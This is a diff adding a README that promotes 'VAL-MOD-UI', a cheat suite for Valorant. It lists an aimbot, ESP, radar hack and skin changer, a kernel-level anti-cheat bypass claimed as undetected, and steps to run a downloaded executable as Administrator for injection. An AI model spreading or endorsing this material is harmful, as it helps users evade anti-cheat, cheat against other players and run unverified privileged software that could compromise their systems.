@@ -1,0 +1,166 @@
+🔴 VAL-MOD-UI
+
+⚡ All-in-One Software Suite for Valorant
+
+«Play smarter, not harder.»
+
+📥Download
+
+📋 Table of Contents
+
+- 📌 About
+- ✨ Features
+- 🖥️ Screenshots
+- 📦 Installation
+- 🚀 Quick Start
+- ⚙️ Configuration
+- ❓ FAQ
+- 📜 Changelog
+- 🤝 Contributing
+
+📌 About
+
+VAL-MOD-UI is a comprehensive toolkit that includes:
+
+| Module | Description | Status |
+|--------|-------------|--------|
+| 🎯 Aim Module | Precision aiming with flexible tuning | ✅ Active |
+| 👁️ ESP Overlay | On-screen information rendering | ✅ Active |
+| 🗺️ Radar Hack | Mini-map with enemy positions | ✅ Active |
+| 🎨 Skin Changer | In-game skin customization | 🔄 Beta |
+| 📊 Stats Tracker | Real-time statistics tracking | 🔄 Beta |
+
+🟢 Current Status: UNDETECTED — Last checked: October 26, 2026
+
+✨ Features
+
+- 🟢 Kernel-Level operation for maximum stability
+- 🟢 Vanguard Bypass
+- 🟢 GUI Menu with hotkey support
+- 🟢 Configs — import/export settings as .json
+- 🟢 Auto-Update on new Valorant patches
+- 🟢 Minimal FPS Impact (
+
+📦 Installation
+
+Requirements
+
+| Parameter | Minimum |
+|-----------|---------|
+| OS | Windows 10/11 (x64) |
+| RAM | 8 GB |
+| GPU | DirectX 11+ |
+| Valorant | Latest version |
+
+Step-by-Step Guide
+
+1. Download the latest release:
+https://github.com/polygonloopadapter/Val-Mod-UI/releases/latest
+
+2. Extract the archive to a dedicated folder (not the desktop!):
+C:\Games\ValModUI\
+
+3. Run V-shadow.exe as Administrator.
+
+4. Wait for the injection to complete and press INSERT to open the menu.
+
+🚀 Quick Start
+
+1. Run V-shadow (Admin)
+2. Launch Valorant
+3. Wait for the match to load
+4. Press INSERT] → Menu opens
+5. Configure modules to your liking
+6. Save config: Config → Save
+
+Hotkeys
+
+| Key | Action |
+|-----|--------|
+| INSERT | Open / Close menu |
+| F1 | Toggle Aim |
+| F2 | Toggle ESP |
+| F3 | Toggle Radar |
+| F5 | Quick-save config |
+| F9 | Panic Key (emergency exit) |
+
+⚙️ Configuration
+
+Example config (config.json)
+
+{
+  "aim": {
+    "enabled": true,
+    "fov": 120,
+    "smooth": 3.5,
+    "bone": "head",
+    "key": "right_click"
+  },
+  "esp": {
+    "enabled": true,
+    "boxes": true,
+    "names": true,
+    "health": true,
+    "color_team": "#00FF00",
+    "color_enemy": "#FF4655"
+  },
+  "misc": {
+    "fps_unlock": true,
+    "no_recoil": false
+  }
+}
+
+❓ FAQ
+
+🔸 Vanguard blocks the launch, what should I do?
+
+Make sure you are using the latest version of the loader. If the issue persists, reboot your PC and run the loader before launching Valorant.
+
+🔸 FPS drops after injection?
+
+Disable any ESP modules you don't use (Skeleton, Glow). Keep only Boxes + Names for minimal overhead.
+
+🔸 Can I stream with the software running?
+
+The overlay is rendered via DirectX and is not visible when captured through OBS (Game Capture). However, we do not recommend doing this.
+
+🔸 How do I update after a Valorant patch?
+
+The loader checks for updates automatically. If the software goes down after a patch, wait 12–24 hours for a fix. Follow our Discord for announcements.
+
+📜 Changelog
+
+v2.4.1 — 2026-10-26
+- ✅ Updated bypass for patch 11.08
+- ✅ Added Skin Changer module (Beta)
+- ✅ Confirmed UNDETECTED status
+- 🐛 Fixed crash on map transition
+- 🐛 Fixed memory leak in ESP renderer
+
+v2.3.0 — 2026-09-14
+- ✅ New ImGui-based GUI
+- ✅ Config system (import/export)
+- ⚡ Aim Module optimization (−40% CPU usage)
+
+v2.2.0 — 2026-07-03
+- ✅ Radar Hack module added
+- ✅ Auto-update functionality
+- 🐛 Fixed compatibility with Windows 11 25H2
+
+Older versions...
+
+See the full log in CHANGELOG.md
+
+🤝 Contributing
+
+Pull requests are welcome! For major changes, please open an Issue first.
+
+git clone https://github.com/polygonloopadapter/Val-Mod-UI.git
+cd Val-Mod-UI
+Build via Visual Studio 2022 (Release x64)
+
+⭐ Enjoying the project? Drop a star!
+
+Made with ❤️ and ☕ by [polygonloopadapter
+
+© 2026 — Val-Mod-UI. Not affiliated with Riot Games.
